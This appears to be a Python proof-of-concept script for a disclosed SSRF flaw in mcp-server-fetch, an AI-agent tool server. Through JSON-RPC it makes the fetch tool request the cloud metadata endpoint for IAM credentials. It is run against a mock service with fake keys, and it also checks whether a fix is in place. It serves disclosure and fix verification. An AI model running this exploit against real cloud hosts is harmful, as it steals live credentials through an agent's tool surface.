"""SSRF reproduction driver: drives mcp-server-fetch against the mock IMDS
service and confirms the vulnerability by observing the fake IAM
credentials flowing back through the JSON-RPC response.

Exit codes:
    0 = VULNERABLE (the AKIA-FAKE token came back through the fetch response)
    1 = FIX VERIFIED (the fix's refusal message came back instead)
    2 = INFRASTRUCTURE FAILURE (couldn't spawn mcp-server-fetch or reach IMDS)
    3 = UNEXPECTED OUTCOME (response matched neither pattern)

In the default harness configuration (mcp-server-fetch==2025.4.7), the
expected outcome is 0 (vulnerability demonstrated). To verify the fix,
rebuild with MCP_FETCH_VERSION set to a post-PR-#4226 release and
re-run; the expected outcome becomes 1.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys

IMDS_URL_DEFAULT = "http://169.254.169.254/latest/meta-data/iam/security-credentials/poc-demo-role"

# The IMDS mock's fake credential response embeds this literal. If it
# round-trips through the JSON-RPC fetch response, the SSRF is confirmed.
VULN_MARKER = "AKIA-FAKE"

# Substrings that indicate the fix is in place. Case-insensitive match.
FIX_MARKERS = (
    "fetching private or non-public",
    "not allowed",
    "blocked",
)


async def _send(proc: asyncio.subprocess.Process, obj: dict) -> None:
    line = json.dumps(obj) + "\n"
    proc.stdin.write(line.encode())
    await proc.stdin.drain()


async def _read_response(proc: asyncio.subprocess.Process, timeout: float = 10.0) -> dict | None:
    try:
        line = await asyncio.wait_for(proc.stdout.readline(), timeout=timeout)
    except TimeoutError:
        return None
    if not line:
        return None
    try:
        return json.loads(line.decode().strip())
    except json.JSONDecodeError:
        return None


async def _terminate(proc: asyncio.subprocess.Process) -> None:
    try:
        if proc.stdin and not proc.stdin.is_closing():
            proc.stdin.close()
        await asyncio.wait_for(proc.wait(), timeout=2.0)
    except (TimeoutError, ProcessLookupError):
        try:
            proc.terminate()
            await asyncio.wait_for(proc.wait(), timeout=1.0)
        except (TimeoutError, ProcessLookupError):
            try:
                proc.kill()
            except ProcessLookupError:
                pass


def _stringify_response(resp: dict) -> str:
    """Pull all string content out of an mcp tools/call response.

    mcp-server-fetch returns content as a list of `{type: 'text', text: ...}`
    objects. Pre-fix versions include the body of the HTTP response in
    the text. Post-fix versions include the refusal message instead.
    """
    result = resp.get("result") or {}
    parts: list[str] = []
    for item in result.get("content", []):
        if isinstance(item, dict):
            t = item.get("text")
            if isinstance(t, str):
                parts.append(t)
    err = resp.get("error")
    if err:
        parts.append(json.dumps(err))
    return "\n".join(parts)


async def main() -> int:
    imds_url = os.environ.get("IMDS_URL", IMDS_URL_DEFAULT)
    mcp_version = os.environ.get("MCP_FETCH_VERSION", "unknown")

    print("=" * 65)
    print(" mcp-witness SSRF PoC reproduction")
    print("=" * 65)
    print(f" mcp-server-fetch version: {mcp_version}")
    print(f" target URL: {imds_url}")
    print(" expected outcome (vulnerable):  AKIA-FAKE token returned")
    print(" expected outcome (fixed):       URL refused as private/non-public")
    print()

    try:
        proc = await asyncio.create_subprocess_exec(
            sys.executable,
            "-m",
            "mcp_server_fetch",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
    except (FileNotFoundError, OSError) as e:
        print(f"INFRA: failed to spawn mcp-server-fetch: {e}", file=sys.stderr)
        return 2

    print("[1/4] initialize handshake ...")
    await _send(
        proc,
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "ssrf-poc-attacker", "version": "1.0"},
            },
        },
    )
    init_resp = await _read_response(proc)
    if init_resp is None or "result" not in init_resp:
        print(f"INFRA: initialize failed: {init_resp}", file=sys.stderr)
        await _terminate(proc)
        return 2

    await _send(proc, {"jsonrpc": "2.0", "method": "notifications/initialized"})

    print("[2/4] tools/list ...")
    await _send(proc, {"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
    tools_resp = await _read_response(proc)
    if tools_resp is None or "result" not in tools_resp:
        print(f"INFRA: tools/list failed: {tools_resp}", file=sys.stderr)
        await _terminate(proc)
        return 2
    tool_names = [t["name"] for t in tools_resp["result"].get("tools", [])]
    print(f"        tools available: {tool_names}")
    if "fetch" not in tool_names:
        print(f"INFRA: fetch tool not found in {tool_names}", file=sys.stderr)
        await _terminate(proc)
        return 2

    print(f"[3/4] tools/call fetch(url={imds_url!r}) ...")
    await _send(
        proc,
        {
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {
                "name": "fetch",
                "arguments": {"url": imds_url},
            },
        },
    )
    fetch_resp = await _read_response(proc, timeout=15.0)
    await _terminate(proc)

    if fetch_resp is None:
        print("INFRA: fetch tool-call timed out or returned nothing", file=sys.stderr)
        return 2

    print("[4/4] analyzing response ...")
    print()

    result_text = _stringify_response(fetch_resp)
    print("---  response body  ---")
    print(result_text[:2000])
    print("--- (end response) ----")
    print()

    if VULN_MARKER in result_text:
        print("=" * 65)
        print(" PoC RESULT: VULNERABLE")
        print("=" * 65)
        print(f" The fake AKIA token ({VULN_MARKER!r}) appears in the response.")
        print(" mcp-server-fetch retrieved cloud-metadata credentials via the")
        print(" agent tool surface with no scheme/host validation. In a real")
        print(" EC2 deployment, these would be live IAM credentials.")
        print()
        print(" disclosure: modelcontextprotocol/servers#4143")
        print(" fix:        modelcontextprotocol/servers PR #4226 (kgarg2468)")
        return 0

    lower = result_text.lower()
    if any(marker in lower for marker in FIX_MARKERS):
        print("=" * 65)
        print(" PoC RESULT: FIX VERIFIED")
        print("=" * 65)
        print(" mcp-server-fetch refused to fetch the metadata endpoint.")
        print(" This is the post-PR-#4226 behavior (scheme allowlist +")
        print(" RFC-reserved-range denylist + per-redirect validation).")
        return 1

    print("=" * 65)
    print(" PoC RESULT: UNEXPECTED")
    print("=" * 65)
    print(" Response matched neither the vulnerable nor fixed pattern.")
    print(" This may indicate a different upstream version, a network")
    print(" routing issue, or an mcp-server-fetch behavior change.")
    return 3


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
